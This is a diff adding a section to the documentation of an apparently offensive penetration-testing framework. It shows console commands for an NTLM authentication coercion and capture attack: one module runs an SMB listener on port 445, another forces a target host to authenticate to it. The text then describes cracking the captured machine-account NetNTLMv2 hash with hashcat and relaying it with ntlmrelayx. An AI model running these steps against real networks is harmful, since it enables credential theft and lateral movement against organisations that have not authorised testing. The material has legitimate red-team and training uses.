@@ -109,3 +109,28 @@ run
 
 `./forge.py -r ~/recon.rc` — boots, runs it, drops you interactive
 with jobs already going.
+
+## The coerce -> capture loop
+
+Two consoles (or `run -j` the capture):
+
+```
+# console 1 — listen for the phoned-home auth (445 needs root)
+use auxiliary/attack/smb_capture
+set LPORT 445
+run
+
+# console 2 — make the target phone home
+use auxiliary/attack/coerce
+set RHOSTS target.corp.local
+set LISTENER <your forge box>
+set DOMAIN corp.local
+set USERNAME anyuser
+set PASSWORD ...
+run
+```
+
+The coerced machine account's NetNTLMv2 lands in loot (type 'hash',
+hashcat mode 5600, challenge pinned to 1122334455667788). Forwarding
+the auth to a second target (real relay) is ntlmrelayx's job — point
+its listener at the same coerce result.
